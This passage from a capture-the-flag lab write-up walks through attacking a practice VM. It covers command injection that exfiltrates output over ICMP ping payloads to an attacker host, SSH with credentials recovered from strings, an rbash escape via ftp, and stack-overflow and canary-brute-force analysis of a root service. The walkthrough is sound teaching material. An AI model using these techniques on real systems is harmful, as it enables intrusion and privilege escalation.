</span><span class='line'><span class="err">ؤ</span><span class="n">T</span><span class="err">�</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span><span class="p">(</span><span class="n">nginx</span><span class="p">)</span>
</span><span class='line'><span class="n">oups</span><span class="o">=</span><span class="mi">498</span>
</span></code></pre></td></tr></table></div></figure>


<h2>sysadmin-tool</h2>

<p>So with actual output to work with, I can almost say I have shell, however, it&rsquo;s crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.</p>

<p>At one stage I ran <code>ls</code> as the command trying to see if there was anything in the web path that I may not have found yet. A file called <em>sysadmin-tool</em> was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through <code>strings</code>:</p>

<figure class='code'><figcaption><span>sysadmin-tool strings</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# strings sysadmin-tool
</span><span class='line'>/lib/ld-linux.so.2
</span><span class='line'>__gmon_start__
</span><span class='line'>libc.so.6
</span><span class='line'>_IO_stdin_used
</span><span class='line'>chroot
</span><span class='line'>strncmp
</span><span class='line'>puts
</span><span class='line'>setreuid
</span><span class='line'>mkdir
</span><span class='line'>rmdir
</span><span class='line'>chdir
</span><span class='line'>system
</span><span class='line'>__libc_start_main
</span><span class='line'>GLIBC_2.0
</span><span class='line'>PTRh
</span><span class='line'><span class="o">[</span>^_<span class="o">]</span>
</span><span class='line'>Usage: sysadmin-tool --activate-service
</span><span class='line'>--activate-service
</span><span class='line'>breakout
</span><span class='line'>/bin/sed -i <span class="s1">&#39;s/^#//&#39;</span> /etc/sysconfig/iptables
</span><span class='line'>/sbin/iptables-restore &lt; /etc/sysconfig/iptables
</span><span class='line'>Service started...
</span><span class='line'>Use avida:dollars to access.
</span><span class='line'>/nginx/usr/share/nginx/html/breakout
</span></code></pre></td></tr></table></div></figure>


<p>From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:</p>

<figure class='code'><figcaption><span>Ping pattern `id` command</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="p">;</span>./sysadmin-tool --activate-service<span class="p">|</span> xxd -p -c 16 <span class="p">|</span> <span class="k">while </span><span class="nb">read </span>line<span class="p">;</span> <span class="k">do </span>ping -p <span class="nv">$line</span> -c 1 -q 192.168.56.102<span class="p">;</span> <span class="k">done</span>
</span></code></pre></td></tr></table></div></figure>




<figure class='code'><figcaption><span>second nmap of Persistence</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# nmap 192.168.56.104 --reason -sV -p-
</span><span class='line'>
</span><span class='line'>Starting Nmap 6.46 <span class="o">(</span> http://nmap.org <span class="o">)</span> at 2014-09-18 09:46 SAST
</span><span class='line'>Nmap scan report <span class="k">for </span>192.168.56.104
</span><span class='line'>Host is up, received reset <span class="o">(</span>0.0017s latency<span class="o">)</span>.
</span><span class='line'>Not shown: 65533 filtered ports
</span><span class='line'>Reason: 65533 no-responses
</span><span class='line'>PORT   STATE SERVICE REASON  VERSION
</span><span class='line'>22/tcp open  ssh     syn-ack OpenSSH 5.3 <span class="o">(</span>protocol 2.0<span class="o">)</span>
</span><span class='line'>80/tcp open  http    syn-ack nginx 1.4.7
</span><span class='line'>
</span><span class='line'>Service detection performed. Please report any incorrect results at http://nmap.org/submit/ .
</span><span class='line'>Nmap <span class="k">done</span>: 1 IP address <span class="o">(</span>1 host up<span class="o">)</span> scanned in 6637.05 seconds
</span></code></pre></td></tr></table></div></figure>


<p>Yay! SSH.</p>

<h2>shell and breakout as avida</h2>

<p>Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:</p>

<figure class='code'><figcaption><span>avida rbash</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
</span><span class='line'>The authenticity of host <span class="s1">&#39;192.168.56.104 (192.168.56.104)&#39;</span> can<span class="s1">&#39;t be established.</span>
</span><span class='line'><span class="s1">RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.</span>
</span><span class='line'><span class="s1">Are you sure you want to continue connecting (yes/no)? yes</span>
</span><span class='line'><span class="s1">Warning: Permanently added &#39;</span>192.168.56.104<span class="s1">&#39; (RSA) to the list of known hosts.</span>
</span><span class='line'><span class="s1">avida@192.168.56.104&#39;</span>s password:    <span class="c"># dollars</span>
</span><span class='line'>Last login: Thu Sep 18 05:57:30 2014
</span><span class='line'>-rbash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>Op success. Or is it? I immediately noticed the prompt as <code>rbash</code>, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a <code>/</code> in them.</p>

<figure class='code'><figcaption><span>rbash restrictions</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rbash-4.1<span class="nv">$ </span>/bin/bash
</span><span class='line'>-rbash: /bin/bash: restricted: cannot specify <span class="sb">`</span>/<span class="err">&#39;</span> in <span class="nb">command </span>names
</span></code></pre></td></tr></table></div></figure>


<p>So the next logical step was to attempt &lsquo;breaking out&rsquo; of this shell so that I can have a better look around. I was able to cat say <code>/etc/passwd</code>, but that only gets you <em>that</em> far :P</p>

<p>After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic <code>vi</code> <code>:shell</code> breakout. Eventually (and out of desperation), I focussed my attention to <code>ftp</code>. Opening <code>ftp</code>, and typing <code>help</code> at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:</p>

<figure class='code'><figcaption><span>bash via ftp o_0</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>-rbash-4.1<span class="nv">$ </span>ftp
</span><span class='line'>ftp&gt; !
</span><span class='line'>+rbash-4.1<span class="nv">$ </span>/bin/bash
</span><span class='line'>bash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I got dropped into another <code>rbash</code> shell, however this time with a +. So, I went for <code>/bin/bash</code> and&hellip; w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!</p>

<h2>the wopr game</h2>

<p>During the enumeration done while still stuck with <code>rbash</code>, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of <code>netstat</code>. Opening a telnet session to this port presented you with a &lsquo;game&rsquo;:</p>

<figure class='code'><figcaption><span>wopr</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>telnet 127.0.0.1 3333
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'>&gt; yes!
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="err">&#39;</span>t think so
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> bye!
</span><span class='line'>Connection closed by foreign host.
</span><span class='line'>bash-4.1<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>I asked really, really nicely, but no matter how polite I was, it would just not let me play!</p>

<p>Further inspection showed that the game was possibly run as root from <code>/usr/local/bin/wopr</code></p>

<figure class='code'><figcaption><span>wopr as root</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bash-4.1<span class="nv">$ </span>ps -ef <span class="p">|</span> grep wopr
</span><span class='line'>root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
</span><span class='line'>root      1577  1005  0 06:43 ?        00:00:00 <span class="o">[</span>wopr<span class="o">]</span> &lt;defunct&gt;
</span><span class='line'>avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr
</span><span class='line'>
</span><span class='line'>bash-4.1<span class="nv">$ </span>ls -lah /usr/local/bin/wopr
</span><span class='line'>-rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
</span></code></pre></td></tr></table></div></figure>


<p><code>wopr</code> was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:</p>

<figure class='code'><figcaption><span>wopr xxd xfer</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="c"># first, hex encode the file</span>
</span><span class='line'>bash-4.1<span class="nv">$ </span>xxd -p -c 36 /usr/local/bin/wopr
</span><span class='line'>7f454c460101010000000000000000000200030001000000c08604083400000080110000
</span><span class='line'>0000000034002000090028001e001b000600000034000000348004083480040820010000
</span><span class='line'><span class="o">[</span>... snip ...<span class="o">]</span>
</span><span class='line'>38362e6765745f70635f7468756e6b2e6278006d61696e005f696e697400
</span><span class='line'>bash-4.1<span class="err">$</span>
</span><span class='line'>
</span><span class='line'><span class="c"># next, I copied the xxd output from the persistence terminal</span>
</span><span class='line'><span class="c"># and pasted it into a file called wopr.xxd. Then reverted it</span>
</span><span class='line'><span class="c"># and redirected the output to `wopr`</span>
</span><span class='line'>root@kali:~# cat wopr.xxd <span class="p">|</span> xxd -r -p &gt; wopr
</span></code></pre></td></tr></table></div></figure>


<p>The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all&hellip;</p>

<h2>wopr, stack smashing</h2>

<p>Poking around the binary, I mostly used <code>gdb</code> along with <a href="https://github.com/longld/peda">peda</a>.
Checksec revealed that this binary was compiled with quite a few security features built in.</p>

<figure class='code'><figcaption><span>wopr binary sec</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# gdb -q ./wopr
</span><span class='line'>Reading symbols from persistence/wopr...<span class="o">(</span>no debugging symbols found<span class="o">)</span>...done.
</span><span class='line'>gdb-peda<span class="nv">$ </span>checksec
</span><span class='line'>CANARY    : ENABLED
</span><span class='line'>FORTIFY   : disabled
</span><span class='line'>NX        : ENABLED
</span><span class='line'>PIE       : disabled
</span><span class='line'>RELRO     : Partial
</span></code></pre></td></tr></table></div></figure>


<p>Digesting the above output should bring us to a few conclusions. A stack canary is present, meaning if we corrupt memory, and dont have a correct canary, the binary may terminate itself as a protection mechanism once it detects the incorrect canary. Secondly, the binary is compiled to mark the stack as non executable. Any potential shellcode that we write here will not be executed. Lastly, the GOT relocation is set to read only, meaning function locations are resolved at the beginning of execution and the GOT is then marked as read only resulting in the inability to rewrite plt type lookups.</p>

<p>With all of that in mind, I ran the binary with the <code>r</code> command, and made a new telnet session to it.</p>

<figure class='code'><figcaption><span>wopr run</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> <span class="nb">bind complete</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> waiting <span class="k">for </span>connections
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> logging queries to <span class="nv">$TMPLOG</span>
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'><span class="o">[</span>New process 26936<span class="o">]</span>
</span><span class='line'><span class="o">[</span>Inferior 2 <span class="o">(</span>process 26936<span class="o">)</span> exited normally<span class="o">]</span>
</span><span class='line'>Warning: not running or target is remote
</span><span class='line'>gdb-peda<span class="err">$</span>
</span></code></pre></td></tr></table></div></figure>


<p>When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a <code>fork()</code></p>

<figure class='code'><figcaption><span>wopr fork()</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>disass main
</span><span class='line'>Dump of assembler code <span class="k">for function </span>main:
</span><span class='line'>    <span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>   0x080489fd &lt;+543&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x8048cb2
</span><span class='line'>   0x08048a04 &lt;+550&gt;:   call   0x804866c &lt;puts@plt&gt;
</span><span class='line'>   0x08048a09 &lt;+555&gt;:   call   0x804867c &lt;fork@plt&gt; <span class="c"># &lt;--</span>
</span><span class='line'>   0x08048a0e &lt;+560&gt;:   <span class="nb">test   </span>eax,eax
</span><span class='line'>   0x08048a10 &lt;+562&gt;:   jne    0x8048b0e &lt;main+816&gt;
</span><span class='line'>   0x08048a16 &lt;+568&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x8<span class="o">]</span>,0x21
</span><span class='line'>   0x08048a1e &lt;+576&gt;:   mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048cc8
</span><span class='line'>   0x08048a26 &lt;+584&gt;:   mov    eax,DWORD PTR <span class="o">[</span>ebp-0x22c<span class="o">]</span>
</span><span class='line'>   0x08048a2c &lt;+590&gt;:   mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,eax
</span><span class='line'>   0x08048a2f &lt;+593&gt;:   call   0x804858c &lt;write@plt&gt;
</span><span class='line'>    <span class="o">[</span>.. snip ..<span class="o">]</span>
</span><span class='line'>End of assembler dump.
</span><span class='line'>gdb-peda<span class="nv">$ </span>
</span></code></pre></td></tr></table></div></figure>


<p>Why is the <code>fork()</code> so important!? We will see in a bit just hang on. :)</p>

<p>So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D</p>

<p>Sending 30 x A&rsquo;s results in:</p>

<figure class='code'><figcaption><span>wopr stopper</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'>*** stack smashing detected ***: wopr <span class="nv">terminated</span>
</span><span class='line'><span class="o">=======</span> Backtrace: <span class="o">=========</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__fortify_fail+0x40<span class="o">)[</span>0xb7f5ebb0<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>+0xeab6a<span class="o">)[</span>0xb7f5eb6a<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80487dc<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x8048ad6<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__libc_start_main+0xe6<span class="o">)[</span>0xb7e8ae36<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80486e1<span class="o">]</span>
</span><span class='line'><span class="o">=======</span> Memory map: <span class="o">========</span>
</span><span class='line'>08048000-08049000 r-xp 00000000 08:01 1184792    wopr
</span><span class='line'>08049000-0804a000 r--p 00000000 08:01 1184792    wopr
</span><span class='line'>0804a000-0804b000 rw-p 00001000 08:01 1184792    wopr
</span><span class='line'>0804b000-0806c000 rw-p 00000000 00:00 0          <span class="o">[</span>heap<span class="o">]</span>
</span><span class='line'>b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
</span><span class='line'>b7e73000-b7e74000 rw-p 00000000 00:00 0
</span><span class='line'>b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
</span><span class='line'>b7fc1000-b7fc4000 rw-p 00000000 00:00 0
</span><span class='line'>b7fde000-b7fe1000 rw-p 00000000 00:00 0
</span><span class='line'>b7fe1000-b7fe2000 r-xp 00000000 00:00 0          <span class="o">[</span>vdso<span class="o">]</span>
</span><span class='line'>b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>b7fff000-b8000000 rw-p 0001c000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
</span><span class='line'>bffdf000-c0000000 rw-p 00000000 00:00 0          <span class="o">[</span>stack<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>So it looks like we may have a <a href="http://en.wikipedia.org/wiki/Stack_buffer_overflow">buffer overflow</a> here. What is important though is the backtrace shows that the last fail was in <code>__fortify_fail</code>. <code>__fortify_fail</code> is normally just a error reporter, as was called because the stack cookie check failed. Remember the CANARY we detected earlier with the <code>checksec</code> output? With that knowledge, is almost safe to assume that byte 30 is where the stack canary starts. This means that if we want to corrupt more memory further up the stack (which is what we want actually), we need to find a way to know what the canary value is.</p>

<p>But lets not stop there. I continued to place more A&rsquo;s into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A&rsquo;s, the backtrace had a full 4 bytes of 41.</p>

<figure class='code'><figcaption><span>possible EIP</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">[</span>+<span class="o">]</span> got a connection
</span><span class='line'>*** stack smashing detected ***: wopr <span class="nv">terminated</span>
</span><span class='line'><span class="o">=======</span> Backtrace: <span class="o">=========</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>__fortify_fail+0x40<span class="o">)[</span>0xb7f5ebb0<span class="o">]</span>
</span><span class='line'>/lib/i386-linux-gnu/libc.so.6<span class="o">(</span>+0xeab6a<span class="o">)[</span>0xb7f5eb6a<span class="o">]</span>
</span><span class='line'>wopr<span class="o">[</span>0x80487dc<span class="o">]</span>
</span><span class='line'><span class="o">[</span>0x41414141<span class="o">]</span>        <span class="c">#&lt;-- EIP?</span>
</span></code></pre></td></tr></table></div></figure>


<p>Was this where EIP was?</p>

<p>With the debugging we have done thus far, lets assume that the stack layout looks something like this:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='text'><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
</span><span class='line'>
</span><span class='line'>[        30 Bytes Data         ] [  Cookie  ] [  4 Bytes  ] [  EIP  ]
</span><span class='line'>
</span><span class='line'>- -&gt;         - -&gt;        [42 Bytes  in Total]        - -&gt;         - &gt;
</span></code></pre></td></tr></table></div></figure>


<h2>wopr &ndash; stack canary bruteforce</h2>

<p>This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.</p>

<p>A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was</p>

<ul>
<li><a href="http://phrack.org/issues/67/13.html">Phrack Issue 67</a></li>
<li><a href="http://fluxius.handgrep.se/2011/10/20/the-art-of-elf-analysises-and-exploitations/">The Art Of ELF: Analysis and Exploitations</a></li>
<li><a href="http://www.pwntester.com/blog/2013/12/31/fusion-level04-write-up/">Fusion level04 write-up</a> (SPOILER ALERTS for another CTF)</li>
</ul>


<p>Now, remember I mentioned <code>fork()</code> earlier on? From the Phrack article, we can read some interesting ideas about binaries that make use of <code>fork()</code> and how this affects stack cookies.</p>

<p>From <code>man 2 fork</code>&rsquo;s description:</p>

<figure class='code'><figcaption><span>fork man</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>DESCRIPTION
</span><span class='line'>     Fork<span class="o">()</span> causes creation of a new process.  The new process <span class="o">(</span>child process<span class="o">)</span>
</span><span class='line'>     is an exact copy of the calling process <span class="o">(</span>parent process<span class="o">)</span> except <span class="k">for </span>the
</span><span class='line'>     following:
</span><span class='line'>
</span><span class='line'> <span class="o">[</span>.. snip ..<span class="o">]</span>
</span></code></pre></td></tr></table></div></figure>


<p>What this means for us then is that every time we have a new <code>fork()</code> happen, the stack cookie will supposedly remain constant between forks as it comes from the parent. <em>”Soooooooo what?”</em> I hear you say! Well, that means we can attempt to try all of the possible ASCII characters as hex, 4 times (for 4 bytes), to try and brute force this value!</p>

<p>The theory for this was great, but the practice was a different story. In order to perform a successful brute force, at the very minimum, I needed a reliable way to determine a correct and incorrect value. With my local copy of <code>wopr</code>, I can just watch the console output, however, I don&rsquo;t have that luxury on the Persistence VM!</p>

<p>While thinking about this problem, I started to code a little script to start the juices flowing in getting this brute force right. The basic idea was to have a nested xrange(4) &ndash;> xrange(255) concat the values to a variable as they are determined. While tinkering with the script and the TCP socket code, I started to realize that there may actually be a way to remotely determine a failed and successful attempt!</p>

<p>When a string of less than 30 A&rsquo;s is sent, the server will send a &ldquo;[+] bye!&rdquo; message before closing the socket. More than 30 A&rsquo;s, and the socket is killed before the bye</p>

<figure class='code'><figcaption><span>Canary Brute Success Condition</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>root@kali:~# telnet 127.0.0.1 3333
</span><span class='line'>Trying 127.0.0.1...
</span><span class='line'>Connected to 127.0.0.1.
</span><span class='line'>Escape character is <span class="s1">&#39;^]&#39;</span>.
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> hello, my name is sploitable
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> would you like to play a game?
</span><span class='line'>&gt; A
</span><span class='line'><span class="o">[</span>+<span class="o">]</span> yeah, I don<span class="s1">&#39;t think so</span>
</span><span class='line'><span class="s1">[+] bye!                           # &lt;-- We have a bye!</span>
</span><span class='line'><span class="s1">Connection closed by foreign host.</span>
</span><span class='line'>
</span><span class='line'><span class="s1">root@kali:~# telnet 127.0.0.1 3333</span>
</span><span class='line'><span class="s1">Trying 127.0.0.1...</span>
</span><span class='line'><span class="s1">Connected to 127.0.0.1.</span>
</span><span class='line'><span class="s1">Escape character is &#39;</span>^<span class="o">]</span><span class="s1">&#39;.</span>
</span><span class='line'><span class="s1">[+] hello, my name is sploitable</span>
</span><span class='line'><span class="s1">[+] would you like to play a game?</span>
</span><span class='line'><span class="s1">&gt; AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA</span>
</span><span class='line'><span class="s1">[+] yeah, I don&#39;</span>t think so
</span><span class='line'>Connection closed by foreign host. <span class="c"># &lt;-- No bye!</span>
</span></code></pre></td></tr></table></div></figure>


<p>This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word <em>bye</em> in the last socket receive to know if we have succeeded or not. The resultant script was therefore:</p>

<figure class='code'><figcaption><span>canary_brute.py</span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
